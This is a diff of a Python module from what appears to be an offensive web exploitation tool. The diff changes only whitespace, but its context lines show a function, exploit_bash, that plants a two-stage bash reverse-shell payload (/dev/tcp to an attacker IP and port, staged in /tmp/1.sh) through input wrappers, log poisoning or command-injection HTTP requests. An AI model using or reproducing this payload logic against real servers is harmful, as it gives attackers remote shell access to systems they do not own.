@@ -7,14 +7,14 @@ from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
 
 def exploit_bash(exploit, method, ip, port):
-    
+
     url = exploit['GETVAL']
     post = exploit["POSTVAL"]
-    
+
     bashTest = "which%20bash"
     bashPayloadStageOne = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
     bashPayloadStageTwo = "bash+/tmp/1.sh"
-    
+
     if(method == "INPUT"):
         bashTmpTest = "which bash"
         bashTmpPayloadStageOne = "echo 'bash -i >& /dev/tcp/"+ip+"/"+str(port)+"+0>&1'>/tmp/1.sh"
@@ -24,7 +24,7 @@ def exploit_bash(exploit, method, ip, port):
             res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTmpTest)), config.proxies, "", "", exploit = True)
         else: 
             res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTmpTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
-        
+
         if("/bash" in res.text):
             printInfo(ip, port, "bash", "input wrapper")
             if(args.postreq):
@@ -65,7 +65,7 @@ def exploit_bash(exploit, method, ip, port):
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, bashPayloadStageOne, encode(bashPayloadStageTwo), bashTest, "/bash", exploit['POSTVAL'])
         return True
-   
+
     if(method == "CMD"):
         if(args.postreq): 
             res,_ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTest)), config.proxies, "", "", exploit = True)
